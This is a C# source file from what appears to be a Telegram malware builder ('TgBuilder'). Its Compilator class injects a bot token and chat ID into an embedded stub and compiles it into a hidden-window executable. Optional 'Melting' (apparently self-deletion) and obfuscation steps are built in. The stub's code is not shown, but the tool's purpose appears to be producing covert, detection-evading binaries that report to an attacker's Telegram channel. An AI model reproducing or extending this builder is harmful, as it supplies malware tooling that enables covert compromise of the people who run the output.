using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;

namespace TgBuilder.Core
{
    internal class Compilator
    {
        public static string Compilate(string Token, string Chatid, string outFile, bool Obfuscate, bool Melting)
        {
            string csharpcode = Properties.Resources.stub
                .Replace("%TOKEN_BOT%", Token)
                .Replace("%CHATID%", Chatid);

            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = outFile,
                CompilerOptions = "/target:winexe /platform:x86",
                IncludeDebugInformation = false
            };

            if (Melting)
            {
                parameters.CompilerOptions += " /define:Melting";
            }
            parameters.ReferencedAssemblies.Add("System.dll");

            using (CSharpCodeProvider codeProvider = new CSharpCodeProvider())
            {
                CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, csharpcode);

                if (results.Errors.Count > 0)
                {
                    using (StreamWriter writer = new StreamWriter("compilation_errors.txt", true))
                    {
                        foreach (CompilerError error in results.Errors)
                        {
                            writer.WriteLine($"Error: {error.ErrorText} in {error.FileName} at {error.Line}:{error.Column}");
                        }
                    }
                    throw new InvalidOperationException("Failed to compile the stub. Check compilation_errors.txt for details.");
                }
            }

            if (Obfuscate)
            {
                string result = Obfuscator.PerformObfuscation(outFile);
                return $"Success to compiling:{Path.GetFileName(outFile)}\nResult obfuscation: {result}";
            }

            return $"Success to compiling output file: {Path.GetFileName(outFile)}";

        }
    }
}